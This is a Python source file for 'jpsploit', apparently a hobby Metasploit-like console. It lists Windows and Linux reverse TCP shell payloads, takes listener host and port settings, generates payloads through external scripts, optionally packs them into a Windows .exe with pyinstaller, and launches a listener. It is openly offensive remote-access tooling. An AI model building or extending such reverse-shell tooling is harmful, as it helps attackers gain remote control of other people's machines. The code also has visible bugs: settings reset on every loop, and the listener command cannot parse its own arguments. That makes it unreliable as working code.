import colored
import os

green = colored.fg('green')
red = colored.fg('red')
white = colored.fg('white')
payloads = ['Windows/windows_shell_reverse_tcp','Linux/linux_shell_reverse_tcp']
listeners = ['Windows/windows_listener','Linux/linux_shell_reverse_tcp']

def clear():
    if os.name == 'nt': 
        _ = os.system('cls') 
    
    else: 
        _ = os.system('clear') 

def showPayloads():
    for payload in payloads:
        print(f'[{green}+{white}] {payload}')

def showHelp():
    print("""
Commands:
- show <payloads,listeners,exploits>
- set <variable> <value>
- use <exploit type> <exploit name>
- show options <exploit type>
- generate
- start listener <ip> <port>
    """)

def generatePayload(payload, lhost, lport):
    try:
        os.system(f'python Payloads/{payload.split("/")[0]}/generate_{payload.split("/")[1]}.pyw {lhost} {lport}')
    except:
        print('Problem on payload generation, verify your inputs')
#TODO - ADD LISTENER GENERATOR ETC AND ADD PYINSTALLER COMAPTIBILITY
def startListener(listener, lhost, lport):
    os.system(f'python {listener}.py {lhost} {lport}')

currentWorkspace = "jpsploit"

while True:
    cmd = input(green+f'({currentWorkspace}) +> ' +white)
    payload = ""
    lport = 0
    lhost =""
    if cmd == 'show payloads':
        showPayloads()
    elif cmd == 'help':
        showHelp()
    elif cmd.startswith('use payload '):
        payload = cmd.split("use payload ")[1]
        if payload not in payloads:
            print(red+'Error: Payload not recognized'+white)
        else:
            currentWorkspace = payload
    elif cmd == 'show options payload':
        print("""- lhost -> Listener IP Address
- lport -> Listener Port""")
    elif cmd.startswith('set lport '):
        lport = cmd.split('lport ')[1]
        print(f'lport{green} => {white}{lport}')
    elif cmd.startswith('set lhost '):
        lhost = cmd.split('lhost ')[1]
        print(f'lhost{green} => {white}{lhost}')
    elif cmd == "clear":
        clear()
    elif cmd == 'generate':
        payload = currentWorkspace
        exe = "N"
        exe = input('Do you want to compile the payload into an exe? (y/N) ')
        generatePayload(payload,lhost,lport)
        if exe.lower()=='y':
            os.system('pyinstaller --onefile Payloads\Generated\payload.pyw')
            os.system('COPY "dist/payload.exe" "Payloads/Generated"')
    #TODO ADD MORE LISTENERS
    elif cmd == 'start listener':
        lhost = cmd.split(' ')[1]
        lport = cmd.split(' ')[2]
        if payload.startswith("Windows"):
            listener = 'Windows/windows_listener'
            startListener(listener, lhost, lport)
            print(f'Started Windows/windows_listener on {lhost}:{lport}')


    else: 
        print('Command not recognized')
